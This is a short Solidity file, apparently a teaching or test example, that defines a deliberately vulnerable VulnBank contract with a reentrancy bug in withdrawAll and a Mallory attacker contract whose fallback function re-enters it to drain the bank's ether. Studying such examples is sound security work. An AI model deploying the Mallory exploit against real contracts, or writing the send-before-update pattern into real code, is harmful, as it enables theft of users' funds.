pragma solidity ^0.5.0;
/*pragma solidity ^0.4.21;*/

contract VulnBank {

    mapping (address => uint) private userBalances;

    function getBalance(address a) public view returns(uint) {
        return userBalances[a];
    }

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        uint amountToWithdraw = userBalances[msg.sender];
       
        // In this example VulnBank unconditionally sends ether to msg.sender.
        // The amount of ether might be 0, which will waste gas, but not do any
        // harm. However, an attacker can re-enter this function and exploit
        // the inconsistent state to drain the contract of ether.
        msg.sender.call.value(amountToWithdraw)("");

        userBalances[msg.sender] = 0;
    }
}

contract Mallory {
    VulnBank vb;

    function attack(VulnBank _vb) public payable {
        vb = _vb;
        // deposit all ether
        vb.deposit.value(address(this).balance)();
        // and extract again
        vb.withdrawAll();
        msg.sender.transfer(address(this).balance);
    }

    function () external payable {
        vb.withdrawAll();
    }
}
